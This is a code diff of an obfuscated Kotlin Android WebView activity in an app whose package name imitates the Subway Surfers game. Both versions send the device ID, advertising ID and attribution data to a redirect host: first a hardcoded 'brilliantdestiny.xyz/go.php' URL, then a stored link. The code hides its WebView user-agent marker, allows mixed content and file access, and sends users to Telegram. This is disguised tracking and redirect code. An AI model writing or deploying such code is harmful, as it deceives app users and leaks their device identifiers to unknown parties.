@@ -5,50 +5,49 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.*
-import androidx.appcompat.app.AppCompatActivity
 import android.provider.MediaStore
-import android.util.Log
 import android.webkit.*
 import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
 import com.appsflyer.AppsFlyerLib
 import com.google.android.material.snackbar.Snackbar
-import com.kiloo.subwaysurfr.GooodClass.Companion.C1111111
-import com.kiloo.subwaysurfr.GooodClass.Companion.D111111
-import com.kiloo.subwaysurfr.GooodClass.Companion.MAIN_IDfr5f
+import com.kiloo.subwaysurfr.GooodClass.Companion.C1hhhhh
+import com.kiloo.subwaysurfr.GooodClass.Companion.gtghyhyhy
+import com.kiloo.subwaysurfr.GooodClass.Companion.rfrgtgttt
 import com.kiloo.subwaysurfr.databinding.ActivityVeeeebVievBinding
 import com.onesignal.OneSignal
+import com.orhanobut.hawk.Hawk
 import org.json.JSONException
 import org.json.JSONObject
 import java.io.File
 import java.io.IOException
 
 class VeeeebVievActivity : AppCompatActivity() {
-    var dfergthyju: String? = null
-    private val fgthyhtyy = 1
-
-    var defrgthyj: ValueCallback<Array<Uri>>? = null
-
-    lateinit var bindfrgthy: ActivityVeeeebVievBinding
-    lateinit var vvfrgthju: WebView
+    private val ofjpeorjfperjg = 1
+    lateinit var jgidhgjdk: WebView
+    lateinit var hrfghrdssxc: ActivityVeeeebVievBinding
+    var rfrgt: ValueCallback<Array<Uri>>? = null
+    var ftgt: String? = null
 
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        bindfrgthy = ActivityVeeeebVievBinding.inflate(layoutInflater)
-        setContentView(bindfrgthy.root)
-        vvfrgthju = bindfrgthy.viewWedfrgftgt
+        hrfghrdssxc = ActivityVeeeebVievBinding.inflate(layoutInflater)
+        setContentView(hrfghrdssxc.root)
+
+        jgidhgjdk = hrfghrdssxc.viewWedfrgftgt
         Snackbar.make(
-            bindfrgthy.root, "Loading...",
+            hrfghrdssxc.root, "Loading...",
             Snackbar.LENGTH_LONG
         ).show()
 
-        val dfvfghcookieManager = CookieManager.getInstance()
-        dfvfghcookieManager.setAcceptCookie(true)
-        dfvfghcookieManager.setAcceptThirdPartyCookies(vvfrgthju, true)
-        dfrgtgttwebSettings()
-        val activitydfrgg: Activity = this
 
-        vvfrgthju.webViewClient = object : WebViewClient() {
+        val cmngcmng = CookieManager.getInstance()
+        cmngcmng.setAcceptCookie(true)
+        cmngcmng.setAcceptThirdPartyCookies(jgidhgjdk, true)
+        dddererer()
+        val aaaaa: Activity = this
+        jgidhgjdk.webViewClient = object : WebViewClient() {
 
 
             override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
@@ -56,11 +55,11 @@ class VeeeebVievActivity : AppCompatActivity() {
                     if (URLUtil.isNetworkUrl(url)) {
                         return false
                     }
-                    if (dfrtgtttg5(url)) {
+                    if (gthykkyjhuu(url)) {
 
-                        val frgtintent = Intent(Intent.ACTION_VIEW)
-                        frgtintent.data = Uri.parse(url)
-                        startActivity(frgtintent)
+                        val intent = Intent(Intent.ACTION_VIEW)
+                        intent.data = Uri.parse(url)
+                        startActivity(intent)
                     } else {
 
                         Toast.makeText(
@@ -85,7 +84,7 @@ class VeeeebVievActivity : AppCompatActivity() {
 
             override fun onPageFinished(view: WebView, url: String) {
                 super.onPageFinished(view, url)
-                frtgt5t8(url)
+                sacaacaca(url)
             }
 
             override fun onReceivedError(
@@ -94,90 +93,85 @@ class VeeeebVievActivity : AppCompatActivity() {
                 description: String,
                 failingUrl: String
             ) {
-                Toast.makeText(activitydfrgg, description, Toast.LENGTH_SHORT).show()
+                Toast.makeText(aaaaa, description, Toast.LENGTH_SHORT).show()
             }
 
 
         }
-        vvfrgthju.webChromeClient = object : WebChromeClient() {
+        jgidhgjdk.webChromeClient = object : WebChromeClient() {
             override fun onShowFileChooser(
                 webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                 fileChooserParams: FileChooserParams
             ): Boolean {
-                defrgthyj?.onReceiveValue(null)
-                defrgthyj = filePathCallback
-                var takePictureIntentferg: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
-                if (takePictureIntentferg!!.resolveActivity(packageManager) != null) {
+                rfrgt?.onReceiveValue(null)
+                rfrgt = filePathCallback
+                var pffrfgt: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
+                if (pffrfgt!!.resolveActivity(packageManager) != null) {
 
-                    var photoFilefrg: File? = null
+                    var photoFile: File? = null
                     try {
-                        photoFilefrg = frggthyhdfrgttth()
-                        takePictureIntentferg.putExtra("PhotoPath", dfergthyju)
+                        photoFile = furhfhr()
+                        pffrfgt.putExtra("PhotoPath", ftgt)
                     } catch (ex: IOException) {
-
                     }
 
-
-                    if (photoFilefrg != null) {
-                        dfergthyju = "file:" + photoFilefrg.absolutePath
-                        takePictureIntentferg.putExtra(
+                    if (photoFile != null) {
+                        ftgt = "file:" + photoFile.absolutePath
+                        pffrfgt.putExtra(
                             MediaStore.EXTRA_OUTPUT,
-                            Uri.fromFile(photoFilefrg)
+                            Uri.fromFile(photoFile)
                         )
                     } else {
-                        takePictureIntentferg = null
+                        pffrfgt = null
                     }
                 }
-                val fghjujjhy = Intent(Intent.ACTION_GET_CONTENT)
-                fghjujjhy.addCategory(Intent.CATEGORY_OPENABLE)
-                fghjujjhy.type = "image/*"
-                val efergthyintentArray: Array<Intent?> =
-                    takePictureIntentferg?.let { arrayOf(it) } ?: arrayOfNulls(0)
-                val frgth = Intent(Intent.ACTION_CHOOSER)
-                frgth.putExtra(Intent.EXTRA_INTENT, fghjujjhy)
-                frgth.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_pic_choose))
-                frgth.putExtra(Intent.EXTRA_INITIAL_INTENTS, efergthyintentArray)
+                val gtgttg = Intent(Intent.ACTION_GET_CONTENT)
+                gtgttg.addCategory(Intent.CATEGORY_OPENABLE)
+                gtgttg.type = "image/*"
+                val frfrfsdddd: Array<Intent?> =
+                    pffrfgt?.let { arrayOf(it) } ?: arrayOfNulls(0)
+                val cbcbcbcb = Intent(Intent.ACTION_CHOOSER)
+                cbcbcbcb.putExtra(Intent.EXTRA_INTENT, gtgttg)
+                cbcbcbcb.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_pic_choose))
+                cbcbcbcb.putExtra(Intent.EXTRA_INITIAL_INTENTS, frfrfsdddd)
                 startActivityForResult(
-                    frgth, fgthyhtyy
+                    cbcbcbcb, ofjpeorjfperjg
                 )
                 return true
             }
 
-
             @Throws(IOException::class)
-            private fun frggthyhdfrgttth(): File {
-                var imageStorageDirdeffgt = File(
+            private fun furhfhr(): File {
+                var imageStorageDir = File(
                     Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                     "DirectoryNameHere"
                 )
-                if (!imageStorageDirdeffgt.exists()) {
-                    imageStorageDirdeffgt.mkdirs()
+                if (!imageStorageDir.exists()) {
+                    imageStorageDir.mkdirs()
                 }
 
-
-                imageStorageDirdeffgt =
-                    File(imageStorageDirdeffgt.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
-                return imageStorageDirdeffgt
+                imageStorageDir =
+                    File(imageStorageDir.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
+                return imageStorageDir
             }
 
         }
 
-        vvfrgthju.loadUrl(getUrlfrgtgtt())
+        jgidhgjdk.loadUrl(frfrrfrfrrfrf())
     }
 
 
-    private fun pushToOneSignalfrgthyhy(string: String) {
-
+    private fun dfrggfggr(string: String) {
         OneSignal.setExternalUserId(
             string,
             object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                 override fun onSuccess(results: JSONObject) {
                     try {
                         if (results.has("push") && results.getJSONObject("push").has("success")) {
-                            val fgtyisPushSuccess = results.getJSONObject("push").getBoolean("success")
+                            val frrfrf = results.getJSONObject("push").getBoolean("success")
                             OneSignal.onesignalLog(
                                 OneSignal.LOG_LEVEL.VERBOSE,
-                                "Set external user id for push status: $fgtyisPushSuccess"
+                                "Set external user id for push status: $frrfrf"
                             )
                         }
                     } catch (e: JSONException) {
@@ -185,11 +179,11 @@ class VeeeebVievActivity : AppCompatActivity() {
                     }
                     try {
                         if (results.has("email") && results.getJSONObject("email").has("success")) {
-                            val efeeeeisEmailSuccess =
+                            val sssdede =
                                 results.getJSONObject("email").getBoolean("success")
                             OneSignal.onesignalLog(
                                 OneSignal.LOG_LEVEL.VERBOSE,
-                                "Set external user id for email status: $efeeeeisEmailSuccess"
+                                "Set external user id for email status: $sssdede"
                             )
                         }
                     } catch (e: JSONException) {
@@ -197,10 +191,10 @@ class VeeeebVievActivity : AppCompatActivity() {
                     }
                     try {
                         if (results.has("sms") && results.getJSONObject("sms").has("success")) {
-                            val fvthyhyytisSmsSuccess = results.getJSONObject("sms").getBoolean("success")
+                            val frgccccv = results.getJSONObject("sms").getBoolean("success")
                             OneSignal.onesignalLog(
                                 OneSignal.LOG_LEVEL.VERBOSE,
-                                "Set external user id for sms status: $fvthyhyytisSmsSuccess"
+                                "Set external user id for sms status: $frgccccv"
                             )
                         }
                     } catch (e: JSONException) {
@@ -217,89 +211,85 @@ class VeeeebVievActivity : AppCompatActivity() {
             })
     }
 
+    private fun dddererer() {
+        val wstwstwstwst = jgidhgjdk.settings
+        wstwstwstwst.javaScriptEnabled = true
 
+        wstwstwstwst.useWideViewPort = true
 
-    private fun getUrlfrgtgtt(): String {
+        wstwstwstwst.loadWithOverviewMode = true
+        wstwstwstwst.allowFileAccess = true
+        wstwstwstwst.domStorageEnabled = true
+        wstwstwstwst.userAgentString = wstwstwstwst.userAgentString.replace("; wv", "")
 
-        val frgtgtSspoon = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
+        wstwstwstwst.javaScriptCanOpenWindowsAutomatically = true
+        wstwstwstwst.setSupportMultipleWindows(false)
 
-        val sharPrefdfrfgtgt52 = getSharedPreferences("SP", MODE_PRIVATE)
+        wstwstwstwst.displayZoomControls = false
+        wstwstwstwst.builtInZoomControls = true
+        wstwstwstwst.setSupportZoom(true)
 
-        val cpOnedfrrtg2: String? = sharPrefdfrfgtgt52.getString(C1111111, "null")
-        val dpOnedfrgt2: String? = sharPrefdfrfgtgt52.getString(D111111, "null")
-        val mainidfrgt5: String? = sharPrefdfrfgtgt52.getString(MAIN_IDfr5f, null)
+        wstwstwstwst.pluginState = WebSettings.PluginState.ON
+        wstwstwstwst.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+        wstwstwstwst.setAppCacheEnabled(true)
 
-        val packdfrfr5 = "com.kiloo.subwaysurfr"
+        wstwstwstwst.allowContentAccess = true
+    }
 
-        val afIdfrgt55 = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
+    private fun frfrrfrfrrfrf(): String {
+
+        val kokokok = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
+
+        val jukukjouk = "com.kiloo.subwaysurfr"
+
+        val myTrID: String? = Hawk.get(GooodClass.frgtgttg, "null")
+        val hkykkyhkyk: String? = Hawk.get(GooodClass.gttgttggtt, "null")
+        val hyhjyjihj: String? = Hawk.get(C1hhhhh)
+        val hoyhyjhi: String? = Hawk.get(gtghyhyhy, "null")
+
+        val gtijgjhitjgt: String = Hawk.get(GooodClass.ghyhplyplhy)
+
+        val gtjhjyjhiy = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
 
 
         AppsFlyerLib.getInstance().setCollectAndroidID(true)
-        val onedfrgt = "sub_id_1="
-        val twofrgt5 = "deviceID="
-        val three656frg = "ad_id="
-        val fourf5g = "sub_id_4="
-        val fivedfr59 = "sub_id_5="
-        val six6f5rf5r = "sub_id_6="
 
 
-        val firstfr5fr6 = "http://"
-        val secondf5 = "brilliantdestiny.xyz/go.php?to=2&"
+        val one = "deviceID="
+        val subOne = "sub_id_1="
+        val thrhtrhtrhtrht = "ad_id="
+        val fofofofofofofofofo = "sub_id_4="
+        val fififififififififif = "sub_id_5="
+        val sisisisifsisis = "sub_id_6="
 
 
-        val linkornulldfrefr5 = "deeporg"
-        val namingfrgtgt5 = "naming"
+        val lololololololo = "naming"
 
 
-        val frgtttg = Build.VERSION.RELEASE
+        val kiokjjlikjhmkij = Build.VERSION.RELEASE
 
-        val resultABdrfr = firstfr5fr6 + secondf5
+        val linkAB: String = Hawk.get(rfrgtgttt)
 
-        var afterfrr = ""
-        if (cpOnedfrrtg2 != "null") {
-            afterfrr =
-                "$resultABdrfr$onedfrgt$cpOnedfrrtg2&$twofrgt5$afIdfrgt55&$three656frg$mainidfrgt5&$fourf5g$packdfrfr5&$fivedfr59$frgtttg&$six6f5rf5r$namingfrgtgt5"
+        var aft = ""
+        if (gtijgjhitjgt == "1") {
+            aft =
+                "$linkAB$subOne$hyhjyjihj&$one$gtjhjyjhiy&$thrhtrhtrhtrht$hoyhyjhi&$fofofofofofofofofo$jukukjouk&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
+            dfrggfggr(gtjhjyjhiy.toString())
         } else {
-            afterfrr =
-                "$resultABdrfr$onedfrgt$dpOnedfrgt2&$twofrgt5$afIdfrgt55&$three656frg$mainidfrgt5&$fourf5g$packdfrfr5&$fivedfr59$frgtttg&$six6f5rf5r$linkornulldfrefr5"
+            aft =
+                "$linkAB$one$myTrID&$thrhtrhtrhtrht$hkykkyhkyk&$fofofofofofofofofo$jukukjouk&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
+            dfrggfggr(myTrID.toString())
         }
-        Log.d("lolo", "link is $afterfrr")
-        pushToOneSignalfrgthyhy(afIdfrgt55.toString())
-        return frgtgtSspoon.getString("SAVED_URL", afterfrr).toString()
-    }
-
-    private fun dfrgtgttwebSettings() {
-        val dfrfgttwebSettings = vvfrgthju.settings
-        dfrfgttwebSettings.javaScriptEnabled = true
-
-        dfrfgttwebSettings.useWideViewPort = true
-
-        dfrfgttwebSettings.loadWithOverviewMode = true
-        dfrfgttwebSettings.allowFileAccess = true
-        dfrfgttwebSettings.domStorageEnabled = true
-        dfrfgttwebSettings.userAgentString = dfrfgttwebSettings.userAgentString.replace("; wv", "")
-
-        dfrfgttwebSettings.javaScriptCanOpenWindowsAutomatically = true
-        dfrfgttwebSettings.setSupportMultipleWindows(false)
-
-        dfrfgttwebSettings.displayZoomControls = false
-        dfrfgttwebSettings.builtInZoomControls = true
-        dfrfgttwebSettings.setSupportZoom(true)
-
-        dfrfgttwebSettings.pluginState = WebSettings.PluginState.ON
-        dfrfgttwebSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
-        dfrfgttwebSettings.setAppCacheEnabled(true)
-
-        dfrfgttwebSettings.allowContentAccess = true
+        return kokokok.getString("SAVED_URL", aft).toString()
     }
 
 
-    private fun dfrtgtttg5(uri: String): Boolean {
+    private fun gthykkyjhuu(uri: String): Boolean {
 
-        val frgtgtpm = packageManager
+        val hyjiyjhjjyj = packageManager
         try {
 
-            frgtgtpm.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)
+            hyjiyjhjjyj.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)
 
 
             return true
@@ -310,7 +300,7 @@ class VeeeebVievActivity : AppCompatActivity() {
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        if (requestCode != fgthyhtyy || defrgthyj == null) {
+        if (requestCode != ofjpeorjfperjg || rfrgt == null) {
             super.onActivityResult(requestCode, resultCode, data)
             return
         }
@@ -318,7 +308,7 @@ class VeeeebVievActivity : AppCompatActivity() {
 
         if (resultCode == AppCompatActivity.RESULT_OK) {
             if (data == null || data.data == null) {
-                results = arrayOf(Uri.parse(dfergthyju))
+                results = arrayOf(Uri.parse(ftgt))
             } else {
                 val dataString = data.dataString
                 if (dataString != null) {
@@ -326,31 +316,30 @@ class VeeeebVievActivity : AppCompatActivity() {
                 }
             }
         }
-        defrgthyj?.onReceiveValue(results)
-        defrgthyj = null
+        rfrgt?.onReceiveValue(results)
+        rfrgt = null
     }
 
 
-    private var frgtghyhy = false
+    private var ujkukjujoujkuj = false
 
+    fun sacaacaca(lurlurlurlurlur: String?) {
+        if (!lurlurlurlurlur!!.contains("t.me")) {
 
-    var frgttthyhh544 = ""
-    fun frtgt5t8(url: String?) {
-        if (!url!!.contains("t.me")) {
-
-            if (frgttthyhh544 == "") {
-                frgttthyhh544 = getSharedPreferences(
+            if (gghghghghhg == "") {
+                gghghghghhg = getSharedPreferences(
                     "SP_WEBVIEW_PREFS",
                     AppCompatActivity.MODE_PRIVATE
                 ).getString(
                     "SAVED_URL",
-                    url
+                    lurlurlurlurlur
                 ).toString()
 
-                val frgtt5t9 = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
-                val editor26dr5fr = frgtt5t9.edit()
-                editor26dr5fr.putString("SAVED_URL", url)
-                editor26dr5fr.apply()
+                val spspspspsppspspsp =
+                    getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
+                val ededededededed = spspspspsppspspsp.edit()
+                ededededededed.putString("SAVED_URL", lurlurlurlurlur)
+                ededededededed.apply()
             }
         }
     }
@@ -358,19 +347,22 @@ class VeeeebVievActivity : AppCompatActivity() {
     override fun onBackPressed() {
 
 
-        if (vvfrgthju.canGoBack()) {
-            if (frgtghyhy) {
-                vvfrgthju.stopLoading()
-                vvfrgthju.loadUrl(frgttthyhh544)
+        if (jgidhgjdk.canGoBack()) {
+            if (ujkukjujoujkuj) {
+                jgidhgjdk.stopLoading()
+                jgidhgjdk.loadUrl(gghghghghhg)
             }
-            this.frgtghyhy = true
-            vvfrgthju.goBack()
+            this.ujkukjujoujkuj = true
+            jgidhgjdk.goBack()
             Handler(Looper.getMainLooper()).postDelayed(Runnable {
-                frgtghyhy = false
+                ujkukjujoujkuj = false
             }, 2000)
 
         } else {
             super.onBackPressed()
         }
     }
+
+    var gghghghghhg = ""
+
 }
